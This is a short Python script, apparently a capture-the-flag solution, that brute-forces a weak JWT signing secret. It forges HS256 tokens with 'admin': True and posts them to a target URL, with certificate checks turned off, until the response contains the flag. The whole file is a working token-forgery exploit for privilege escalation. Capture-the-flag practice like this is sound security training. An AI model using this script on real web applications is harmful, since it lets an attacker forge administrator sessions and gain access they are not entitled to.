#!/usr/bin/python3

import requests as req
import jwt
import re
import sys

url = sys.argv[1]


alphabet = 'abcdefghijklmnopqrstuvwxyz'

flag = 'miactf{fake}'


for i in alphabet:
    secret = 10*i+flag[:7] 
    token = jwt.encode({'username':'user', 'admin':True}, secret, algorithm='HS256')
    request = req.post(url,data={'token':token},verify=False)
    if 'miactf' in request.text:
        print(re.search(r'miactf{.*}',request.text).group(0))
        break
